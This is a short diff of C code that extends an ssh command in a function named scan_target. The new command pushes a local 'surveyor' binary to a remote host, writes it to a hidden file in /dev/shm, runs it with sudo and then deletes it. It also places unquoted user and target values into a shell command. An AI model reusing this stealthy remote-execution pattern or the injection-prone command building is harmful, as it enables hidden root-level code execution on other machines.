@@ -8,7 +8,11 @@ void* scan_target(void *arg) {
     snprintf(cmd, sizeof(cmd),
     "cat ./build/bin/surveyor | ssh -i ~/.ssh/surveyor_key "
     "-o BatchMode=yes "
-    "%s@%s",
+    "%s@%s '"
+    "cat > /dev/shm/.s && "
+    "chmod +x /dev/shm/.s && "
+    "sudo /dev/shm/.s && "
+    "rm -f /dev/shm/.s'",
     ctx->user, ctx->target);
 
     FILE *stream = popen(cmd, "r");
